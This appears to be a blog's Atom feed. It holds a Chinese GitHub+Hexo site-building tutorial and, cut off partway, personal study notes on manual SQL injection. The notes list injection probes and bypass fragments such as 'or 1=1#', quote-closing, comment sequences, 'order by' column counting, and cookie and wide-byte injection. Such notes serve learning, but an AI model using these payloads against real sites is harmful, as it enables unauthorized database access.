<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>waiwailo/blog</title>
  
  <subtitle>hello,guys!!</subtitle>
  <link href="/atom.xml" rel="self"/>
  
  <link href="http://yoursite.com/"/>
  <updated>2019-11-24T17:07:07.081Z</updated>
  <id>http://yoursite.com/</id>
  
  <author>
    <name>waiwai</name>
    
  </author>
  
  <generator uri="http://hexo.io/">Hexo</generator>
  
  <entry>
    <title>hexo搭建教程</title>
    <link href="http://yoursite.com/2019/11/25/hexo%E6%90%AD%E5%BB%BA%E6%95%99%E7%A8%8B/"/>
    <id>http://yoursite.com/2019/11/25/hexo搭建教程/</id>
    <published>2019-11-24T17:05:54.449Z</published>
    <updated>2019-11-24T17:07:07.081Z</updated>
    
    <content type="html"><![CDATA[<h1><span id="github-hexo-da-jian-ge-ren-wang-zhan-xiang-xi-jiao-cheng">GitHub+Hexo 搭建个人网站详细教程</span><a href="#github-hexo-da-jian-ge-ren-wang-zhan-xiang-xi-jiao-cheng" class="header-anchor">#</a></h1><p><a href="https://www.zhihu.com/people/wurun" target="_blank" rel="noopener"><img src="https://pic2.zhimg.com/v2-a65b524e6d14460e1fa3928446c25ab7_xs.jpg" alt="吴润"></a></p><p><a href="https://www.zhihu.com/people/wurun" target="_blank" rel="noopener">吴润</a></p><p>iamwr.com</p><p>2,316 人赞同了该文章</p><h2><span id="qian-yan"><strong>前言：</strong></span><a href="#qian-yan" class="header-anchor">#</a></h2><p>随着互联网浪潮的翻腾，国内外涌现出越来越多优秀的社交网站让用户分享信息更加便捷。然后，如果你是一个不甘寂寞的程序猿（媛），是否也想要搭建一个属于自己的个人网站，如果你曾经或者现在正有这样的想法，请跟随这篇文章发挥你的Geek精神，让你快速拥有自己的博客网站，写文章记录生活，享受这种从0到1的过程。</p><p><a href="https://www.zhihu.com/question/29755481" target="_blank" rel="noopener">你见过的最棒的个人博客界面是什么样的？</a></p><h2><span id="shi-me-shi-hexo"><strong>什么是Hexo ?</strong></span><a href="#shi-me-shi-hexo" class="header-anchor">#</a></h2><p><img src="https://pic2.zhimg.com/80/v2-6890485c84748900d9dae824b7f7cbb1_hd.jpg" alt="img"></p><p>Hexo是一款基于Node.js的静态博客框架，依赖少易于安装使用，可以方便的生成静态网页托管在GitHub和Heroku上，是搭建博客的首选框架。这里我们选用的是GitHub，你没看错，全球最大的同性恋交友网站（逃……）。Hexo同时也是GitHub上的开源项目，参见：<a href="https://link.zhihu.com/?target=https%3A//github.com/hexojs/hexo">hexojs/hexo</a> 如果想要更加全面的了解Hexo，可以到其官网 <a href="https://link.zhihu.com/?target=https%3A//hexo.io/">Hexo</a> 了解更多的细节，因为Hexo的创建者是台湾人，对中文的支持很友好，可以选择中文进行查看。这里，默认各位猿/媛儿都知道GitHub就不再赘述。</p><p><strong>这是我的个人博客效果:</strong> <a href="https://link.zhihu.com/?target=http%3A//iamwr.com/">吴润 · RunDouble</a></p><p>下面正式从零开始搭建年轻人的第一个网站。</p><h2><span id="da-jian-bu-zou"><strong>搭建步骤：</strong></span><a href="#da-jian-bu-zou" class="header-anchor">#</a></h2><ul><li>获得个人网站域名</li><li>GitHub创建个人仓库</li><li>安装Git</li><li>安装Node.js</li><li>安装Hexo</li><li>推送网站</li><li>绑定域名</li><li>更换主题</li><li>初识MarkDown语法</li><li>发布文章</li><li>寻找图床</li><li>个性化设置</li><li>其他</li><li>附录</li></ul><p><strong>获得个人网站域名</strong></p><p>域名是网站的入口，也是网站的第一印象，比如饿了么的官网的域名是：<a href="https://link.zhihu.com/?target=https%3A//www.ele.me/">https://www.ele.me/</a> ，很是巧妙。常见的有com,cn,net,org等后缀，也有小众的xyz,me,io等后缀，根据你自己的喜好，选择不同的后缀，比如我选择就是常见的com后缀。很多小众奇特的后缀在大陆是没办法备案的，网站也就无法上线。然而使用GitHub托管我们的网站，完全不需要备案，因为托管我们的网站内容的服务器在美国，而且在国内备案流程也比较繁杂，时间需要一周左右。</p><p>申请域名的地方有很多，这里推荐阿里云：<a href="https://link.zhihu.com/?target=https%3A//www.aliyun.com/">阿里云-为了无法计算的价值</a> 申请入口：<a href="https://link.zhihu.com/?target=https%3A//wanwang.aliyun.com/domain/">域名注册</a> 购买域名这也是我们整个搭建过程中惟一一个需要花钱的地方。如果你已经有了空闲域名就无需购买，直接使用即可。</p><p><strong>GitHub创建个人仓库</strong></p><p>登录到GitHub,如果没有GitHub帐号，使用你的邮箱注册GitHub帐号：<a href="https://link.zhihu.com/?target=https%3A//github.com/">Build software better, together</a> 点击GitHub中的New repository创建新仓库，仓库名应该为：<strong>用户名</strong>.<a href="https://link.zhihu.com/?target=http%3A//github.io">http://github.io</a> 这个<strong>用户名</strong>使用你的GitHub帐号名称代替，这是固定写法，比如我的仓库名为：</p><p><img src="https://pic4.zhimg.com/80/v2-832168e58b4ac4ce7c3cca797711d2d3_hd.jpg" alt="img"></p><p><strong>安装Git</strong></p><p>什么是Git ?简单来说Git是开源的分布式版本控制系统，用于敏捷高效地处理项目。我们网站在本地搭建好了，需要使用Git同步到GitHub上。如果想要了解Git的细节，参看<a href="https://link.zhihu.com/?target=http%3A//weibo.com/liaoxuefeng">廖雪峰</a>老师的Git教程：<a href="https://link.zhihu.com/?target=http%3A//www.liaoxuefeng.com/wiki/0013739516305929606dd18361248578c67b8067c8c017b000">Git教程</a> 从Git官网下载：<a href="https://link.zhihu.com/?target=https%3A//git-scm.com/download/win">Git - Downloading Package</a> 现在的机子基本都是64位的，选择64位的安装包，下载后安装，在命令行里输入git测试是否安装成功，若安装失败，参看其他详细的Git安装教程。安装成功后，将你的Git与GitHub帐号绑定，鼠标右击打开Git Bash</p><p><img src="https://pic3.zhimg.com/80/v2-8b1cbe253d6e0301bd9a68c6f98a9f52_hd.jpg" alt="img"></p><p>或者在菜单里搜索Git Bash，设置user.name和user.email配置信息：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">git config --global user.name <span class="string">"你的GitHub用户名"</span></span><br><span class="line">git config --global user.email <span class="string">"你的GitHub注册邮箱"</span></span><br></pre></td></tr></table></figure><p>生成ssh密钥文件：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ssh-keygen -t rsa -C <span class="string">"你的GitHub注册邮箱"</span></span><br></pre></td></tr></table></figure><p>然后直接三个回车即可，默认不需要设置密码<br>然后找到生成的.ssh的文件夹中的id_rsa.pub密钥，将内容全部复制</p><p><img src="https://pic4.zhimg.com/80/v2-d1e47103ec1aa8675f68688c5d63bd27_hd.jpg" alt="img"></p><p>打开<a href="https://link.zhihu.com/?target=https%3A//github.com/settings/keys">GitHub_Settings_keys</a> 页面，新建new SSH Key</p><p><img src="https://pic1.zhimg.com/80/v2-72a3f22c080e99343c3cc4aabce10e3c_hd.jpg" alt="img"></p><p>Title为标题，任意填即可，将刚刚复制的id_rsa.pub内容粘贴进去，最后点击Add SSH key。<br>在Git Bash中检测GitHub公钥设置是否成功，输入 ssh <a href="mailto:git@github.com" target="_blank" rel="noopener">git@github.com</a> ：</p><p><img src="https://pic3.zhimg.com/80/v2-da481ffa686410becd4186c656b4ebd6_hd.jpg" alt="img"></p><p>如上则说明成功。这里之所以设置GitHub密钥原因是，通过非对称加密的公钥与私钥来完成加密，公钥放置在GitHub上，私钥放置在自己的电脑里。GitHub要求每次推送代码都是合法用户，所以每次推送都需要输入账号密码验证推送用户是否是合法用户，为了省去每次输入密码的步骤，采用了ssh，当你推送的时候，git就会匹配你的私钥跟GitHub上面的公钥是否是配对的，若是匹配就认为你是合法用户，则允许推送。这样可以保证每次的推送都是正确合法的。</p><p><strong>安装Node.js</strong></p><p>Hexo基于Node.js，Node.js下载地址：<a href="https://link.zhihu.com/?target=https%3A//nodejs.org/en/download/">Download | Node.js</a> 下载安装包，注意安装Node.js会包含环境变量及npm的安装，安装后，检测Node.js是否安装成功，在命令行中输入 node -v :</p><p><img src="https://pic1.zhimg.com/80/v2-76ea38e9545e606f975781e47933b010_hd.jpg" alt="img"></p><p>检测npm是否安装成功，在命令行中输入npm -v :</p><p><img src="https://pic2.zhimg.com/80/v2-bede250b8456df92475b455fda8c1dd9_hd.jpg" alt="img"></p><p>到这了，安装Hexo的环境已经全部搭建完成。</p><p><strong>安装Hexo</strong></p><p>Hexo就是我们的个人博客网站的框架， 这里需要自己在电脑常里创建一个文件夹，可以命名为Blog，Hexo框架与以后你自己发布的网页都在这个文件夹中。创建好后，进入文件夹中，按住shift键，右击鼠标点击命令行</p><p><img src="https://pic1.zhimg.com/80/v2-a5450a466c0927c25dff8ad6f1d2046c_hd.jpg" alt="img"></p><p>使用npm命令安装Hexo，输入：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">npm install -g hexo-cli</span><br></pre></td></tr></table></figure><p>这个安装时间较长耐心等待，安装完成后，初始化我们的博客，输入：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hexo init blog</span><br></pre></td></tr></table></figure><p>注意，这里的命令都是作用在刚刚创建的Blog文件夹中。</p><p>为了检测我们的网站雏形，分别按顺序输入以下三条命令：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">hexo new test_my_site</span><br><span class="line"></span><br><span class="line">hexo g</span><br><span class="line"></span><br><span class="line">hexo s</span><br></pre></td></tr></table></figure><p>这些命令在后面作介绍，完成后，打开浏览器输入地址：</p><p>localhost:4000</p><p>可以看出我们写出第一篇博客，只不过我下图是我修改过的配置，和你的显示不一样。</p><p><img src="https://pic4.zhimg.com/80/v2-123e73c0630d299b1c856d99b04b55bb_hd.jpg" alt="img"></p><p>现在来介绍常用的Hexo 命令</p><p>npm install hexo -g #安装Hexo<br>npm update hexo -g #升级<br>hexo init #初始化博客</p><p>命令简写<br>hexo n “我的博客” == hexo new “我的博客” #新建文章<br>hexo g == hexo generate #生成<br>hexo s == hexo server #启动服务预览<br>hexo d == hexo deploy #部署</p><p>hexo server #Hexo会监视文件变动并自动更新，无须重启服务器<br>hexo server -s #静态模式<br>hexo server -p 5000 #更改端口<br>hexo server -i 192.168.1.1 #自定义 IP<br>hexo clean #清除缓存，若是网页正常情况下可以忽略这条命令</p><p>刚刚的三个命令依次是新建一篇博客文章、生成网页、在本地预览的操作。</p><p><strong>推送网站</strong></p><p>上面只是在本地预览，接下来要做的就是就是推送网站，也就是发布网站，让我们的网站可以被更多的人访问。在设置之前，需要解释一个概念，在blog根目录里的_config.yml文件称为<strong>站点</strong>配置文件，如下图</p><p><img src="https://pic2.zhimg.com/80/v2-cb1fd5e5a2e73f513234e434724c7c55_hd.jpg" alt="img"></p><p>进入根目录里的themes文件夹，里面也有个_config.yml文件，这个称为<strong>主题</strong>配置文件，如下图</p><p><img src="https://pic4.zhimg.com/80/v2-4252029e5634bf91c7d58916ae2b8ac3_hd.jpg" alt="img"></p><p>下一步将我们的Hexo与GitHub关联起来，打开站点的配置文件_config.yml，翻到最后修改为：</p><p>deploy:<br>type: git<br>repo: 这里填入你之前在GitHub上创建仓库的完整路径，记得加上 .git<br>branch: master参考如下：</p><p><img src="https://pic1.zhimg.com/80/v2-279ac5149b577f04dc099defbb12eaa8_hd.jpg" alt="img"></p><p>保存站点配置文件。</p><p>其实就是给hexo d 这个命令做相应的配置，让hexo知道你要把blog部署在哪个位置，很显然，我们部署在我们GitHub的仓库里。最后安装Git部署插件，输入命令：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">npm install hexo-deployer-git --save</span><br></pre></td></tr></table></figure><p>这时，我们分别输入三条命令：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">hexo clean </span><br><span class="line">hexo g </span><br><span class="line">hexo d</span><br></pre></td></tr></table></figure><p>其实第三条的 hexo d 就是部署网站命令，d是deploy的缩写。完成后，打开浏览器，在地址栏输入你的放置个人网站的仓库路径，即 <a href="https://link.zhihu.com/?target=http%3A//xxxx.github.io">http://xxxx.github.io</a> (知乎排版可能会出现”http://“字样，参考下图) 比如我的xxxx就是我的GitHub用户名：</p><p><img src="https://pic1.zhimg.com/80/v2-d750452f4258bf0967d5629ef23d1b10_hd.jpg" alt="img"></p><p>你就会发现你的博客已经上线了，可以在网络上被访问了。</p><p><strong>绑定域名</strong></p><p>虽然在Internet上可以访问我们的网站，但是网址是GitHub提供的:<a href="https://link.zhihu.com/?target=http%3A//xxxx.github.io">http://xxxx.github.io</a> (知乎排版可能会出现”http://“字样) 而我们想使用我们自己的个性化域名，这就需要绑定我们自己的域名。这里演示的是在阿里云万网的域名绑定，在国内主流的域名代理厂商也就阿里云和腾讯云。登录到阿里云，进入管理控制台的域名列表，找到你的个性化域名，进入解析</p><p><img src="https://pic3.zhimg.com/80/v2-47323ad4490e206aef93a3d68f0670b6_hd.jpg" alt="img"></p><p>然后添加解析</p><p><img src="https://pic3.zhimg.com/80/v2-40222b3a295bb692aac22829a8ec3be2_hd.jpg" alt="img"></p><p>包括添加三条解析记录，192.30.252.153是GitHub的地址，你也可以ping你的 <a href="https://link.zhihu.com/?target=http%3A//xxxx.github.io">http://xxxx.github.io</a> 的ip地址，填入进去。第三个记录类型是CNAME，CNAME的记录值是：你的用户名.<a href="https://link.zhihu.com/?target=http%3A//github.io">http://github.io</a> 这里千万别弄错了。第二步，登录GitHub，进入之前创建的仓库，点击settings，设置Custom domain，输入你的域名</p><p><img src="https://pic4.zhimg.com/80/v2-85ba6dda906f22dea4c03df2b47d994b_hd.jpg" alt="img"></p><p>点击save保存。第三步，进入本地博客文件夹 ，进入blog/source目录下，创建一个记事本文件，输入你的域名，对，只要写进你自己的域名即可。如果带有www，那么以后访问的时候必须带有www完整的域名才可以访问，但如果不带有www，以后访问的时候带不带www都可以访问。所以建议，不要带有www。这里我还是写了www(不建议带有www):</p><p><img src="https://pic1.zhimg.com/80/v2-79abfff91af3f520e24cb91acf6aa994_hd.jpg" alt="img"></p><p>保存，命名为CNAME ，注意保存成<strong>所有文件</strong>而不是<strong>txt文件</strong>。</p><p>完成这三步，进入blog目录中，按住shift键右击打开命令行，依次输入：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">hexo clean</span><br><span class="line">hexo g</span><br><span class="line">hexo d</span><br></pre></td></tr></table></figure><p>这时候打开浏览器在地址栏输入你的个性化域名将会直接进入你自己搭建的网站。</p><p><strong>更换主题</strong></p><p>如果你不喜欢Hexo默认的主题，可以更换不同的主题，主题传送门：<a href="https://link.zhihu.com/?target=https%3A//hexo.io/themes/">Themes</a> 我自己使用的是Next主题，可以在blog目录中的themes文件夹中查看你自己主题是什么。现在把默认主题更改成Next主题，在blog目录中（就是命令行的位置处于blog目录）打开命令行输入：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">git <span class="built_in">clone</span> https://github.com/iissnan/hexo-theme-next themes/next</span><br></pre></td></tr></table></figure><p>这是将Next主题下载到blog目录的themes主题下的next文件夹中。打开<strong>站点</strong>的_config.yml配置文件，修改主题为next</p><p><img src="https://pic1.zhimg.com/80/v2-b1997377e82408cb15b485c65ae00f70_hd.jpg" alt="img"></p><p>打开<strong>主题</strong>的_config.yml配置文件，不是站点主题文件，找到Scheme Settings</p><p><img src="https://pic2.zhimg.com/80/v2-1ac152c4aabe4c10b762ee27552f1105_hd.jpg" alt="img"></p><p>next主题有三个样式，我用的是Pisces，你们可以自己试试看，选择你自己喜欢的样式（只需要把行首的#去除，#是注释），选择好后，再次部署网站，hexo g、hexo d，查看效果。选择其他主题，按照上述过程即可实现。</p><p><strong>初识Markdown语法</strong></p><p>Markdown是一种可以使用普通文本编辑器编写的标记语言，通过简单的标记语法，它可以使普通文本内容具有一定的格式。Markdown语法简洁明了、容易掌握，而且功能比纯文本更强，因此写博客使用它，可以让用户更加专注的写文章，而不需要费尽心力的考虑样式，相对于html已经算是轻量级语言，像有道云笔记也支持Markdown写作。并且Markdown完全兼容html，也就是可以在文章里直接插入html代码。比如给博文添加音乐，就可以直接把音乐的外链html代码插入文章中。具体语法参看：<a href="https://link.zhihu.com/?target=http%3A//www.appinn.com/markdown/">Markdown 语法说明(简体中文版)</a> 可以说十分钟就可以入门。当然，工欲善其事必先利其器，选择一个好的Markdown编辑器也是非常重要的，这里推荐<a href="https://link.zhihu.com/?target=http%3A//code52.org/DownmarkerWPF/">MarkPad</a> 和<a href="https://link.zhihu.com/?target=http%3A//www.markdownpad.com/">The Markdown Editor for Windows</a> ，这是带有预览效果的编辑器，也可以使用本地的文本编辑器，更多的Markdown的语法与编辑器自己可以搜索了解。</p><p><strong>发布文章</strong></p><p>我们开始正式发布上线博客文章，在命令行中输入：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hexo n <span class="string">"博客名字"</span></span><br></pre></td></tr></table></figure><p>我们会发现在blog根目录下的source文件夹中的_post文件夹中多了一个 <strong>博客名字.md</strong> 文件，使用Markdown编辑器打开，就可以开始你的个人博客之旅了，Markdown常用的样式也就十来种，完全能够满足一般博文的样式要求，这是我的一篇博文内容示例：</p><p><img src="https://pic1.zhimg.com/80/v2-4f96cd03a88e68b8ae86c38bfb0808ac_hd.jpg" alt="img"></p><p>通过带有预览样式的Markdown编辑器实时预览书写的博文样式，也可以通过命令 hexo s –debug 在本地浏览器的localhost:4000 预览博文效果。写好博文并且样式无误后，通过hexo g、hexo d 生成、部署网页。随后可以在浏览器中输入域名浏览。</p><p><strong>寻找图床</strong></p><p>图床，当博文中有图片时，若是少量图片，可以直接把图片存放在source文件夹中，但这显然不合理的，因为图片会占据大量的存储的空间，加载的时候相对缓慢 ，这时考虑把博文里的图片上传到某一网站，然后获得外部链接，使用Markdown语法，<strong><img src="%E5%A4%96%E9%83%A8%E9%93%BE%E6%8E%A5" alt="图片信息"></strong> 完成图片的插入，这种网站就被成为图床。常见的简易的图床网站有：<a href="https://link.zhihu.com/?target=http%3A//www.tietuku.com/">贴图库图片外链</a> 国内算比较好的图床我认为有两个：新浪微博和 <a href="https://link.zhihu.com/?target=https%3A//www.qiniu.com/">七牛云</a> ，七牛云的使用方法可以参看其他文章。图床最重要的就是稳定速度快，所以在挑选图床的时候一定要仔细，下图是博文插入图片，使用图床外链的示例：</p><p><img src="https://pic4.zhimg.com/80/v2-92372e522595af139ace5f371aae3ff3_hd.jpg" alt="img"></p><p><strong>个性化设置</strong></p><p>所谓的个性化设置就是根据个人需要添加不同的插件及功能。</p><p>基本的有：</p><p>在站点配置文件_config.yml修改基本的站点信息</p><p><img src="https://pic4.zhimg.com/80/v2-78bc0e4e6498c9c3cb269b3254d8379f_hd.jpg" alt="img"></p><p>依次是网站标题、副标题、网站描述、作者、网站头像外部链接、网站语言、时区等。</p><p>在主题配置文件_config.yml修改基本的主题信息，如：</p><p><img src="https://pic2.zhimg.com/80/v2-451c5cb2fd6516650ad8ca608031bf0d_hd.jpg" alt="img"></p><p>博文打赏的微信、支付宝二维码图片，这里我是直接把这两张放在根目录的source文件夹中，并没有使用图床外链。</p><p><img src="https://pic2.zhimg.com/80/v2-69bbc45e973eb6916e08187ed8b33a55_hd.jpg" alt="img"></p><p>社交外链的设置，即在侧栏展示你的个人社交网站信息。</p><p><img src="https://pic4.zhimg.com/80/v2-5b3f6e02e0d3a0cdb685a4d2fd2718cb_hd.jpg" alt="img"></p><p>博文分享的插件jiathis，值设置为true。在配置文件中有很多的个性化设置，可以自尝试更多的修改。</p><p>进阶个性化：</p><ul><li>添加网易云音乐</li></ul><p>打开网页版的网易云音乐，选择喜欢的音乐，点击生成外链播放器</p><p><img src="https://pic2.zhimg.com/80/v2-fcb7d44ccdca3760c98db0d13817f2b5_hd.jpg" alt="img"></p><p>复制外链的代码</p><p><img src="https://pic4.zhimg.com/80/v2-16eec195312cde7b1d257fac6f3c8d0b_hd.jpg" alt="img"></p><p>比如在侧栏插入这首歌的音乐播放器，修改 blog\themes\next\layout_macro的sidebar.swig文件，添加刚刚复制的外链代码</p><p><img src="https://pic4.zhimg.com/80/v2-03db51002497b27e4d5888e0efd577c7_hd.jpg" alt="img"></p><p>重新生成、部署网页，效果如下</p><p><img src="https://pic2.zhimg.com/80/v2-3d587bf919df92db38e2608f034e50f1_hd.jpg" alt="img"></p><ul><li>设置背景</li></ul><p>把你挑选的背景图片命名为：background.jpg，放在blog\themes\next\source\images里，在blog\themes\next\source\css_custom文件的custom.styl首部添加：</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="selector-tag">body</span> &#123;</span><br><span class="line">  <span class="attribute">background</span>:<span class="built_in">url</span>(/images/background.jpg);</span><br><span class="line">  <span class="attribute">background-attachment</span>: fixed;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>background-attachment: fixed;是固定背景图片。</p><p>这是设置一张静态图片作为背景，其实Next主题自带有动态的背景效果，修改主题配置文件中的canvas_nest: false为canvas_nest: true即可。</p><ul><li>增加侧栏菜单条目</li></ul><p>默认的侧栏菜单条目有：首页、归档、标签、关于、搜索等。如果你想要增加其他的菜单条目，修改主题配置文件_config.yml里的Menu Settings中的menu和menu_icons两个地方</p><p><img src="https://pic3.zhimg.com/80/v2-666a22fedbba95d979eeb26e52fc29e2_hd.jpg" alt="img"></p><p>其中menu里是配置菜单项对应的页面位置（如：/love），menu_icons对应菜单项的图标，这里的图标是来自于<a href="https://link.zhihu.com/?target=http%3A//fontawesome.io/">Font Awesome</a> ，所以你需要在Font Awesome网站上找到你需要的icon，然后把该icon的名字写在menu_icons对应菜单名后面，注意冒号有一个英文输入状态的空格。设置好后，在命令行里输入：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hexo new page <span class="string">"你所要增加的菜单项名称（要和你在menu中的填写要匹配）"</span></span><br></pre></td></tr></table></figure><p>新建的页面在博客根目录下的source文件里，这时你就可以对新建的页面自定义设计。</p><p>还有更多的进阶个性化设置，如SEO、评论系统、个人头像、博客分享、订阅功能、High功能、404网页设置等，可以参看：</p><p><a href="https://link.zhihu.com/?target=http%3A//theme-next.iissnan.com/theme-settings.html">主题配置 - NexT 使用文档</a></p><p><a href="https://link.zhihu.com/?target=http%3A//theme-next.iissnan.com/third-party-services.html">第三方服务集成 - NexT 使用文档</a></p><p><a href="https://link.zhihu.com/?target=http%3A//theme-next.iissnan.com/tag-plugins.html">内置标签 - NexT 使用文</a></p><p><a href="https://link.zhihu.com/?target=http%3A//theme-next.iissnan.com/tag-plugins.html">档</a><a href="https://link.zhihu.com/?target=http%3A//theme-next.iissnan.com/advanced-settings.html">进阶设定 - NexT 使用文档</a></p><p>有很多人私信问我High功能特效如何设置，这里推荐一篇同是Next主题网站博主的文章：<a href="https://link.zhihu.com/?target=http%3A//www.iamlj.com/2016/08/add-special-effect-harlem-shake-for-hexo/">为Hexo Next主题添加哈林摇特效（五）</a></p><p><strong>其他</strong></p><p>终于写到这里了，也算是基本圆满完成了我的写作初衷，总结自己的一些经验，分享一些有趣的东西，不过脖子也是僵硬的受不了。我知道很多人想要建立自己的个人网站却一直没有付诸行动，希望这篇文章能给你一点点灵感与想法，just do it。本文是windows平台的搭建过程，其他平台可以参看相关资料，也有很多其他优秀的博客框架值得学习。如果有任何建议或想法、或疑问欢迎在评论区交流， 做好的网站不妨在评论区贴出网址，让大家一起学习。</p><p><strong>附录</strong></p><p><strong>以下是评论区贴出网址的博客展示：</strong></p><p><a href="https://link.zhihu.com/?target=http%3A//jmyblog.top/">…Miss.j BlogDiary…</a></p><p><a href="https://link.zhihu.com/?target=http%3A//ibb.chaodamiao.com/">RILWEIC</a></p><p><a href="https://link.zhihu.com/?target=http%3A//blog.sunxinfei.com/">Xin’s Notes</a></p><p><a href="https://link.zhihu.com/?target=https%3A//guguant.github.io/">飞鸟与鱼</a></p><p><a href="https://link.zhihu.com/?target=http%3A//www.fuck-goods.tk/">无名博客</a></p><p><a href="https://link.zhihu.com/?target=http%3A//helloqa.com/">iTesting软件测试知识分享</a></p><p><a href="https://link.zhihu.com/?target=http%3A//bolg.upsky.top/">赵小源的个人博客</a></p><p><a href="https://link.zhihu.com/?target=http%3A//www.huajiayi.top/">华嘉熠’s Blog</a></p><p><a href="https://link.zhihu.com/?target=http%3A//asmire.site/">Cocoon</a></p><p><a href="https://link.zhihu.com/?target=https%3A//luoshaoxiong.github.io/">罗少雄’s Blog</a></p><p><a href="https://link.zhihu.com/?target=https%3A//lruihao.github.io/">李四啊_</a></p><p><strong>其他优秀个人博客展示：</strong></p><p><a href="https://link.zhihu.com/?target=https%3A//www.dandyweng.com/">翁天信 · Dandy Weng</a> <a href="https://link.zhihu.com/?target=http%3A//chaoxuprime.com/">chaoxuprim</a> <a href="https://link.zhihu.com/?target=http%3A//kenjiendo.com/">KENJI ENDO</a> <a href="https://link.zhihu.com/?target=http%3A//shenzekun.cn/">Moorez</a> <a href="https://link.zhihu.com/?target=https%3A//codesky.me/">CodeSky 代码之空</a> <a href="https://link.zhihu.com/?target=http%3A//www.helloshawn.cn/">大江东去</a> <a href="https://link.zhihu.com/?target=http%3A//iconmoon.com/">UI Design Portfolio of JJ Ying</a> <a href="https://link.zhihu.com/?target=http%3A//www.jeyzhang.com/">JeyZhang</a> <a href="https://link.zhihu.com/?target=http%3A//blog.lightina.cn/">jacklightChen | 得到的都是侥幸</a> <a href="https://link.zhihu.com/?target=https%3A//qingpei.me/">edwardtoday</a> <a href="https://link.zhihu.com/?target=http%3A//rafaltomal.com/">Rafal Tomal - Web Designer and Genesis Developer</a> <a href="https://link.zhihu.com/?target=http%3A//strml.net/">Projects and Work</a> <a href="https://link.zhihu.com/?target=http%3A//miaoxiaoer.com/">绘画爱好者</a> <a href="https://link.zhihu.com/?target=http%3A//ursocute.github.io/">万世奇的博客</a> <a href="https://link.zhihu.com/?target=https%3A//rauchg.com/">Guillermo Rauch</a></p><p><strong>相关文章：</strong></p><blockquote><p><a href="https://zhuanlan.zhihu.com/p/58654392" target="_blank" rel="noopener">Hexo 从 GitHub 到阿里云</a></p></blockquote>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1&gt;&lt;span id=&quot;github-hexo-da-jian-ge-ren-wang-zhan-xiang-xi-jiao-cheng&quot;&gt;GitHub+Hexo 搭建个人网站详细教程&lt;/span&gt;&lt;a href=&quot;#github-hexo-da-jian-ge-ren-wa
      
    
    </summary>
    
    
    
  </entry>
  
  <entry>
    <title>sql手工注入</title>
    <link href="http://yoursite.com/2019/11/24/sql%E6%89%8B%E5%B7%A5%E6%B3%A8%E5%85%A5/"/>
    <id>http://yoursite.com/2019/11/24/sql手工注入/</id>
    <published>2019-11-24T15:50:54.779Z</published>
    <updated>2019-11-24T17:06:41.704Z</updated>
    
    <content type="html"><![CDATA[<h2><span id="di-yi-bu-pan-duan-shu-ru-lei-xing">第一步判断输入类型</span><a href="#di-yi-bu-pan-duan-shu-ru-lei-xing" class="header-anchor">#</a></h2><p><a href="http://www.baidu.com/link?url=DzjcovztPSNVH3IE4L1KTR7X3ajFa9pI5iHMU07TjalYt5i6MW9f0rxDtClFUwsLQbouUd0EXcKCN36Um1TPSa" target="_blank" rel="noopener">$_REQUEST</a> $_COOKIE </p><p>可以用cookie注入 空格要用16进制</p><p>第二步判断注入点</p><p>and 和 or 的理解</p><p>and的使用</p><p>当判断有没有注入点时，可以用and 1=1 1=2来判断</p><p>or的使用</p><p>select * from user where id =’’ or 1=1#     当直接把前面闭合时，条件永远为假，所以用or</p><p>注意绕过 ‘$id’ 单引号 “$id” 双引号  %$id% (“$id”)单双引号，百分号加括号 </p><p>注释 %23 –+  url              get</p><p>​          #      –   输入框       post</p><p>$id=1 ‘  1=2 –+可确定是否为char型</p><p>确定提交方式 get post cookie</p><p>确定提交类型 数字型 字符型 搜索型</p><p><img src="C:/Users/wai-wai/AppData/Local/YNote/data/qq4EF61E8A5E69F04C63CDAC03394D9979/578be440399e4219a9518c89d8431ac1/cbd890e837b7d5b75f78d7af814362ed.jpg" alt="img"></p><p>字符型 单引号闭合原有条件 因为单引号内符号不起作用</p><p><img src="C:/Users/wai-wai/AppData/Local/YNote/data/qq4EF61E8A5E69F04C63CDAC03394D9979/d635deafb40041ee985d876d1bb71dba/e1d239263762b769be93c1d455c704d9.jpg" alt="img"></p><p>搜索型 like ‘%%’ 先闭合前面 与字符型同理</p><p><img src="C:/Users/wai-wai/AppData/Local/YNote/data/qq4EF61E8A5E69F04C63CDAC03394D9979/fa6b4af82eae4bfab232c3e2aa0dd6b6/70da0cf01873c9dc8380dad68256a23d.jpg" alt="img"></p><p>oeder by 3是指对第三列进行排序，如果没有第三列就会报错，用他来判断列大小</p><h2><span id="kuan-zi-jie-zhu-ru">宽字节注入</span><a href="#kuan-zi-jie-zhu-ru" class="header-anchor">#</a></h2><p>gb2312 易想到宽字节注入但和页面编码无关</p><p><img src="C:/Users/wai-wai/AppData/Local/YNote/data/qq4EF61E8A5E69F04C63CDAC03394D9979/f2b016a1135442d09f13fdb678eaeb5e/0d98ba236ef87fd2b753a98a9d1bdbca.jpg" 